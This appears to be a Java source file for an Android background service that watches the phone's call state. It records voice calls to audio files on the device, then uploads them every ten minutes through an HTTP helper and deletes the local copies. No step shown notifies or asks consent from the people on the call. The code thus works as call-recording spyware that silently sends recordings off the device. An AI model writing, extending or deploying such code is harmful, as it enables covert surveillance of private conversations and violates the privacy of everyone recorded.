package org.kohaerenzstiftung.stupid;



import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Message;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.apache.http.entity.FileEntity;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.IOException;
import java.util.LinkedList;
import java.util.List;


public class Service extends org.kohaerenzstiftung.Service {

	TelephonyManager mTelephonyManager;
	private Thread mRecorderThread;
	private Thread mHttpThread;
	private MediaRecorder mMediaRecorder = new MediaRecorder();
	private boolean mRestart = true;
	private boolean mIsRecording;
	private boolean mRecording = false;
	private long mCurrentFileTimestamp;

	private PhoneStateListener mPhoneStateListener = new PhoneStateListener() {
		public void onCallStateChanged(int state, String incomingNumber) {
			Service.this.onCallStateChanged(state, incomingNumber);
		}
	};

	private OnErrorListener mOnErrorListener = new OnErrorListener() {
		
		@Override
		public void onError(MediaRecorder mr, int what, int extra) {
			Service.this.onMediaRecorderError(mr, what, extra);
		}
	};
	private OnInfoListener mOnInfoListener = new OnInfoListener() {
		
		@Override
		public void onInfo(MediaRecorder mr, int what, int extra) {
			Log.i("MFS", "what : " + what);
			Service.this.onMediaRecorderInfo(mr, what, extra);
		}
	};
	private boolean mIsCall;
	private boolean mWasCall;



	private int getAudioSource() {
		int callState = mTelephonyManager.getCallState();
		int result = (callState == TelephonyManager.CALL_STATE_OFFHOOK) ?
				MediaRecorder.AudioSource.VOICE_CALL :
					MediaRecorder.AudioSource.MIC;

		mWasCall = mIsCall;
		mIsCall = (result == MediaRecorder.AudioSource.VOICE_CALL);
				
		return result;
	}

	public void rotateFile() {
		Log.i("MFS", "rotateFile");
		interrupt();
	}

	private synchronized void restartIf() throws IllegalStateException, IOException {
		int audioSource = getAudioSource();
		if ((audioSource == MediaRecorder.AudioSource.VOICE_CALL)&&(mIsRecording)&&(mRestart)) {
			mMediaRecorder.reset();
			mMediaRecorder.setOnErrorListener(mOnErrorListener);
			mMediaRecorder.setOnInfoListener(mOnInfoListener);
			mMediaRecorder.setAudioSource(audioSource);
			mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

			mMediaRecorder.setMaxFileSize(104857600);

			mCurrentFileTimestamp = System.currentTimeMillis();
			String pathName =
					getExternalFilesDir(null) + File.separator + (mCurrentFileTimestamp + ".3gp");
			mMediaRecorder.setOutputFile(pathName);

			mMediaRecorder.prepare();
			mRestart = false;


			mMediaRecorder.start();
			setRecording(true);
		}
	}

	private synchronized void setRecording(boolean value) {
		if (!value) {
			String call = mWasCall ? ".call" : "";
			String pathName =
					getExternalFilesDir(null) + File.separator + (mCurrentFileTimestamp + ".3gp");
			File file = new File(pathName);
			if (file.exists()) {
				long now = System.currentTimeMillis();
				String newPath = getExternalFilesDir(null) + File.separator +
						mCurrentFileTimestamp + "-" + now + call + ".3gp";
				File newFile = new File(newPath);
				file.renameTo(newFile);
			}
		}
		mRecording = value;
	}

	private boolean isWifiConnected() {
		ConnectivityManager connManager =
				(ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
		boolean result = mWifi.isConnected();
		return result;
	}

	private void httpFunction() {
		while (true) {
			try {
				doHttpFunction();
				Thread.sleep(1000 * 60 * 10);
			} catch (Throwable t) {
				t.printStackTrace();
			}
		}
	}

	private void doHttpFunction() throws Throwable {
		File externalFilesDir = getExternalFilesDir(null);
		File[] files = externalFilesDir.listFiles();
		for (File file : files) {
			if (!file.getName().contains("-")) {
				continue;
			}
			FileEntity fileEntity = new FileEntity(file, "audio/3gpp");
			List<BasicNameValuePair> headers = new LinkedList<BasicNameValuePair>();
			BasicNameValuePair basicNameValuePair = new BasicNameValuePair("name", file.getName());
			headers.add(basicNameValuePair);
			basicNameValuePair = new BasicNameValuePair("action", "live");
			headers.add(basicNameValuePair);

			if (!(isWifiConnected()||Helper.haveConfig(this))) {
				break;
			}

			if (Helper.performHttp(this, headers, fileEntity)) {
				file.delete();
			} else {
				break;
			}
		}
	}

	private void recorderFunction() {
		mTelephonyManager =
				(TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		mTelephonyManager.listen(mPhoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
		while (true) {
			try {
				restartIf();

				Thread.sleep(1000 * 60 * 60);
				
			} catch (Throwable t) {
				if (!(t instanceof InterruptedException)) {
					t.printStackTrace();
				}
			}
		}
	}

	@Override
	protected void handleStartCommand() {
		try {
			if (mRecorderThread != null) {
				return;
			}

			mIsRecording = Helper.recordingEnabled(this);

			mRecorderThread = new Thread() {
				@Override
				public void run() {
					super.run();
					recorderFunction();
				}
			};
			mHttpThread = new Thread() {
				@Override
				public void run() {
					super.run();
					httpFunction();
				}
			};
			mRecorderThread.start();
			mHttpThread.start();

		} catch (Throwable t) {
			mRecorderThread = null;
		}
	}

	private void interrupt() {
		if (mRecording) {
			try {
				mMediaRecorder.stop();
				setRecording(false);
			} catch (Throwable t) {
				//so what???
			}
		}
		mRestart = true;
		mRecorderThread.interrupt();
	}

	protected synchronized void onCallStateChanged(int state, String incomingNumber) {
		Log.i("MFS", "onCallStateChanged");
		interrupt();
	}

	private synchronized void stopRecording() {
		Log.i("MFS", "stopRecording");
		interrupt();
	}

	@Override
	protected ServiceHandler getFreeServiceHandler() {
		return null;
	}

	@Override
	protected void fillMessage(Intent intent, int flags, int startId,
			Message msg) {
	}

	protected synchronized void onMediaRecorderInfo(MediaRecorder mr, int what, int extra) {
		if ((what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED)||
				(what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_FILESIZE_REACHED)) {
			if (mRecorderThread != null) {
				setRecording(false);
				Log.i("MFS", "onMediaRecorderInfo");
				interrupt();
			}
		}
	}

	protected void onMediaRecorderError(MediaRecorder mr, int what, int extra) {
		stopRecording();
	}

	public boolean isRecording() {
		return mIsRecording;
	}

	public synchronized boolean toggleRecording() {

		mIsRecording = !mIsRecording;

		Helper.setRecordingEnabled(this, mIsRecording);
		Log.i("MFS", "toggleRecording");
		interrupt();

		return mIsRecording;
	}

	@Override
	protected boolean needsHandling(Intent intent) {
		return false;
	}

}
